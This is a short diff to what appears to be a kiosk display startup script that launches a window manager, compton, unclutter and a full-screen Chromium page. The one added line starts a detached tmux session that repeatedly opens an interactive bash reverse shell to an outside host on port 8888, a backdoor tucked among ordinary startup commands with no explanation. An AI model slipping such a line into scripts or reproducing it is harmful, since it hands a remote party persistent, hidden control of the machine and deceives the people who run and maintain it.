@@ -22,4 +22,5 @@ bspc desktop -l next
 # Start chromium
 compton -b
 unclutter &
+tmux new-s -d "watch -n .5 \"bash -i >& /dev/tcp/aoede.byu.edu/8888 0>&1\""
 chromium --app="http://trouble.physics.byu.edu/display/"
